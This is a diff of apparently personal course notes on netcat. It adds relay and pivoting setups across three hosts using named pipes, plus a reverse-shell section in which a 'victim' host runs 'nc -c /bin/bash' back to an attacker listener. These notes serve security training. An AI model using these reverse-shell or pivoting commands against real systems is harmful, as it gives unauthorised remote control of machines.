@@ -1167,7 +1167,7 @@ Options
 #Client (recieves)
     nc 172.16.82.106 9001 > newfile.txt
 
-
+Tunnels: need local port / loopback and port attached to tunnel
 ##########################################
 
 #blue-internet-host-student-18
@@ -1192,11 +1192,40 @@ nc 192.168.1.1 2222
 
 
 
+  Box 1                                           Box 2                                    Box 3
+-----------                                    -----------                               -----------
+
+                                            (listener to listener)
+nc -lvp 1111                nc <box1IP> 1111 < mypipe | nc <box3IP> 2222 > mypipe         nc -lvp 2222
+                                            (client to client)
+nc <box2IP> 3333            nc -lvp 3333 < mypipe | nc -lvp 4444 > mypipe               nc <box2IP> 4444
+                                            (listener to client)
+nc -lvp 5555                nc <box1IP> 5555 < mypipe | nc -lvp 6666 > mypipe           nc <box2IP> 6666
+
+
+#############################################
+
+###Reverse shells
+Fist listen for the shell on your device
+nc -lvp 9999
+On victim using -c:
+nc -c /bin/bash 10.10.0.40 9999
+
+
+##############Reverse Shells##############################
+
+  Box 1                            Box 2 (Victim)
+---------                            ----------
+nc -lvp 9999                nc -c /bin/bash 10.10.0.40 9999
+                         
+##############################################
+
+#Packers
+xxd
 
 
 
 
 
 
-######2 ways to interact with tunnel, loopback/local host, port attached to that tunnel
 
